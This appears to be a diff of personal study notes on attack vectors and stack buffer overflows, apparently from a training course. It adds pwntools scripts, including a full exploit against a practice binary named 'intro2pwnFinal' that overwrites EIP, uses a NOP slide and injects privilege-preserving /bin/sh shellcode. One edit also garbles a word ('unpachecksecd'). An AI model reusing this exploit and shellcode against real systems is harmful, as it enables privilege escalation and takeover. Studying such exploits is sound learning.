@@ -2,7 +2,7 @@
 
 ## Definitions
 - **Attack Vector**: tool, technique method USED to attack
-  - weapons, phishing, DOS, Web drive-by, Flaws in browser, unpached vulnerability
+  - weapons, phishing, DOS, Web drive-by, Flaws in browser, unpachecksecd vulnerability
 - **Attack Surface**: surface area of the victim that ca be impacted
   - unarmoured body, email server, internet-facebing web, end-user machine, humans
 - **Attack Surface Reduction**: 
@@ -31,6 +31,18 @@
 - Write more than the capacity of the memory
 - Generating cyclic patterns
   - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+
+```
+from pwn import *
+
+padding = cyclic(cyclic_find('jaaa'))
+
+eip = p32(0xdeadbeef)
+
+payload = padding + eip
+
+print(payload)
+```
 
 - Method 1
   - Generate payload with metasploit
@@ -86,7 +98,35 @@
     - -f a = asci
     - -f s = string
     - shellcraf i386.linux.sh
-    - shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f a
+    - shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f 
+
+```
+from pwn import *
+
+proc = process('./intro2pwnFinal')
+
+proc.recvline()
+
+padding = cyclic(cyclic_find('taaa'))
+
+eip = p32(0xffffd510+200)
+
+nop_slide = "\x90"*1000
+
+# shellcraft i386.linux.sh
+
+# shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
+
+
+shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+
+payload = padding + eip + nop_slide + shellcode
+
+proc.send(payload)
+
+proc.interactive()
+```
+
 
 
 # Assembly in Windows
